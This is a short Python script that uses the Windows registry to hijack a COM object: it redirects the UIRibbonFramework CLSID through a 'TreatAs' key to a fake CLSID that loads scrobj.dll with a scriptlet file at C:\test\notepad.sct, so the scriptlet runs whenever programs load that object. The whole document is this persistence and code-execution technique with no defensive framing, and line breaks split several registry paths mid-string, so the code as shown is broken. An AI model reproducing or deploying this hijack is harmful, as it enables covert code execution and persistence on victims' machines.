import _winreg


a=_winreg.CreateKey(_winreg.HKEY_CURRENT_USER,'Software\Classes\CLSID

\{926749FA-2615-4987-8845-C33E65F2B957}\TreatAs')                                           ##UIRibbonFramework object(our target Object)


b=_winreg.CreateKey(_winreg.HKEY_CURRENT_USER,'Software\Classes\CLSID

\{00000001-0001-0001-0001-000011111111}\InProcServer32')

c=_winreg.CreateKey(_winreg.HKEY_CURRENT_USER,'Software\Classes\CLSID

\{00000001-0001-0001-0001-000011111111}\ScriptletURL')



_winreg.SetValueEx(b,None,0,_winreg.REG_SZ,"C:\Windows

\System32\scrobj.dll")


_winreg.SetValueEx(c,None,0,_winreg.REG_SZ,"C:\\test\notepad.sct")

_winreg.SetValueEx(b,"ThreadingModel",0,_winreg.REG_SZ,"Apartment")

_winreg.SetValueEx(a,None,0,_winreg.REG_SZ,"{00000001-0001-0001-0001-

000011111111}")
